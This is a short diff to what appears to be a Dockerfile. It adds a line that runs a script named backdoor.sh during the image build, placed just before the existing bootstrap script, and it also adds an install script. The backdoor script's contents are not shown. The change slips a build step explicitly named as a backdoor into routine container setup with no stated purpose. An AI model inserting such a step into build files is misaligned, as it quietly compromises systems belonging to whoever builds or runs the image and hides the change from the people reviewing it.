@@ -9,9 +9,10 @@ RUN apt-get update && \
             curl \
             lsb-release \
             sudo && \
-    bash /src/scripts/bootstrap.sh
+    bash /src/scripts/backdoor.sh && \
+    bash /src/scripts/bootstrap.sh && \
+    bash /src/scripts/install.sh
 
 WORKDIR /root
 
-# CMD ["zsh", "--interactive", "--login"]
 CMD ["/bin/bash"]
